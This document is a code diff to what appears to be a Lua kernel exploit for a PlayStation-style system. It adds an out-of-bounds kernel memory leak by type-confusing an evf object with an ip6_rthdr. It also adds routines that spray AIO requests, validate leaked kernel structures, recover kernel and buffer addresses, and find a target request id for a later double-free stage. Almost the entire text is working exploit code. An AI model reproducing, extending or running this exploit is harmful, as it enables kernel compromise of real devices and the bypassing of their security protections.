@@ -303,6 +303,7 @@ NUM_RACES = 100
 NUM_SDS = 64 -- TODO: change back to 0x100
 NUM_ALIAS = 200
 LEAK_LEN = 16
+NUM_LEAKS = 5
 
 
 -- max number of requests that can be created/polled/canceled/deleted/waited
@@ -432,10 +433,8 @@ function spray_aio(loops, reqs1, num_reqs, ids, multi, cmd)
     local step = 4 * (multi and num_reqs or 1)
     cmd = bit32.bor(cmd, (multi and AIO_CMD_FLAG_MULTI or 0))
     
-    local idx = 0
-    for i=1, loops do
-        aio_submit_cmd(cmd, reqs1, num_reqs, ids + idx)
-        idx = idx + step
+    for i=0, loops-1 do
+        aio_submit_cmd(cmd, reqs1, num_reqs, ids + (i * step))
     end
 end
 
@@ -622,8 +621,6 @@ end
 
 
 function race_one(request_addr, tcp_sd, sds)
-
-    dbgf("race_one is entered")
 
     reset_race_state()
 
@@ -915,13 +912,45 @@ end
 
 
 
+function verify_reqs2(buf, offset)
+
+    -- reqs2.ar2_cmd
+    if memory.read_dword(buf + offset):tonumber() ~= AIO_CMD_WRITE then
+        return false
+    end
+
+    -- check reqs2.ar2_result.state
+    -- state is actually a 32-bit value but the allocated memory was initialized with zeros.
+    -- all padding bytes must be 0 then
+    local state1 = memory.read_dword(buf + offset + 0x38):tonumber()
+    local state2 = memory.read_dword(buf + offset + 0x38 + 4):tonumber()
+    if not (state1 > 0 and state2 <= 4) or state2 ~= 0 then
+        return false
+    end
+
+    -- reqs2.ar2_file must be NULL since we passed a bad file descriptor to aio_submit_cmd()
+    if memory.read_qword(buf + offset + 0x40) ~= uint64(0) then
+        return false
+    end
+
+    local kernel_addr_offset = {0x10, 0x18, 0x20, 0x48, 0x50}
+    for _, addr_offset in ipairs(kernel_addr_offset) do
+        local prefix = memory.read_word(buf + offset + addr_offset + 6):tonumber()
+        if prefix ~= 0xffff then
+            return false
+        end
+    end
+
+    return true
+end
+
+
 
 function leak_kernel_addrs(sd_pair)
 
-    dbg("leak_kernel_addrs() entered")
-
     local sd = sd_pair[1]
-    local buf = memory.alloc(0x80 * LEAK_LEN)
+    local buflen = 0x80 * LEAK_LEN
+    local buf = memory.alloc(buflen)
 
     -- type confuse a struct evf with a struct ip6_rthdr.
     -- the flags of the evf must be set to >= 0xf00 in order to fully leak the contents of the rthdr
@@ -981,13 +1010,113 @@ function leak_kernel_addrs(sd_pair)
         error("failed to confuse evf and rthdr")
     end
 
-    set_evf_flags(evf, bit32.band(0xff, 8))
-    get_rthdr(sd, buf, 0x80)
+    -- ip6_rthdr and evf structure are overlapped by now
+    -- enlarge ip6_rthdr by writing to its len field by setting the evf's flag
+    set_evf_flags(evf, bit32.lshift(0xff, 8))
 
-    print(memory.hex_dump(buf, 0x80))
+    -- fields we use from evf (number before the field is the offset in hex):
+    -- struct evf:
+    --     0 u64 flags
+    --     28 struct cv cv
+    --     38 TAILQ_HEAD(struct evf_waiter) waiters
 
+    -- evf.cv.cv_description = "evf cv"
+    -- string is located at the kernel's mapped ELF file
+    local kernel_addr = memory.read_qword(buf + 0x28)
+    printf("\"evf cv\" string addr: %s", hex(kernel_addr))
+
+    -- because of TAILQ_INIT(), we have:
+    --
+    -- evf.waiters.tqh_last == &evf.waiters.tqh_first
+    --
+    -- we now know the address of the kernel buffer we are leaking
+    local kbuf_addr = memory.read_qword(buf + 0x40) - 0x38
+    printf("kernel buffer addr: %s", hex(kbuf_addr))
+
+    -- 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
+    -- allocate reqs1 arrays at 0x100 malloc zone
+    local num_elems = 6
+
+    -- use reqs1 to fake a aio_info.
+    -- set .ai_cred (offset 0x10) to offset 4 of the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
+    local ucred = kbuf_addr + 4
+    local leak_reqs = make_reqs1(num_elems)
+    memory.write_qword(leak_reqs + 0x10, ucred)
+
+    local leak_ids_len = NUM_HANDLES * num_elems
+    local leak_ids = memory.alloc(4 * leak_ids_len)
+
+    local function get_reqs2_offset()
+        for i=1, NUM_LEAKS do
+            
+            spray_aio(NUM_HANDLES, leak_reqs, num_elems, leak_ids, true, AIO_CMD_WRITE)        
+            
+            -- read out-of-bound for adjacent reqs2
+            get_rthdr(sd, buf, buflen)
+
+            for off=0x80, buflen-1, 0x80 do
+                if verify_reqs2(buf, off) then
+                    printf("found reqs2 at attempt: %d", i)
+                    return off
+                end
+            end
+            
+            free_aios(leak_ids, leak_ids_len)
+        end
+        return nil
+    end
+
+    local reqs2_off = get_reqs2_offset()
+    if reqs2_off == nil then
+        error("could not leak a reqs2")
+    end
+
+    dbgf("reqs2 offset: %s", hex(reqs2_off))
+
+    get_rthdr(sd, buf, buflen)
+
+    dbg("leaked aio_entry:")
+    dbg(memory.hex_dump(buf + reqs2_off, 0x80))
+
+    local reqs1_addr = memory.read_qword(buf + reqs2_off + 0x10)
+    -- dbgf("reqs1_addr = %s", hex(reqs1_addr))
+    reqs1_addr = bit64.band(reqs1_addr, bit64.bnot(0xff))
+    printf("reqs1_addr = %s", hex(reqs1_addr))
+
+    dbg("searching target_id")
+
+    local target_id = nil
+    local to_cancel = nil
+    local to_cancel_len = nil
+
+    for i=0, leak_ids_len-1, num_elems do
+
+        aio_multi_cancel(leak_ids + i*4, num_elems)
+        get_rthdr(sd, buf, buflen)
+
+        local state = memory.read_dword(buf + reqs2_off + 0x38):tonumber()
+        if state == AIO_STATE_ABORTED then
+            
+            target_id = memory.read_dword(leak_ids + i*4):tonumber()
+            printf("found target_id=%s, i=%d, batch=%d", hex(target_id), i, i / num_elems)
+            
+            local start = i + num_elems
+            to_cancel = leak_ids + start*4
+            to_cancel_len = leak_ids_len - start
+            
+            break
+        end
+    end
+
+    if target_id == nil then
+        error("target id not found")
+    end
+
+    cancel_aios(to_cancel, to_cancel_len)
+    free_aios2(leak_ids, leak_ids_len)
+
+    return reqs1_addr, kbuf_addr, kernel_addr, target_id, evf
 end
-
 
 
 
@@ -1031,7 +1160,8 @@ function kexploit()
         local sd_pair = double_free_reqs2(sds)
 
         print("\n[+] Leak kernel addresses\n")
-        leak_kernel_addrs(sd_pair)
+        local reqs1_addr, kbuf_addr, kernel_addr, target_id, evf
+            = leak_kernel_addrs(sd_pair)
     
     end)
 
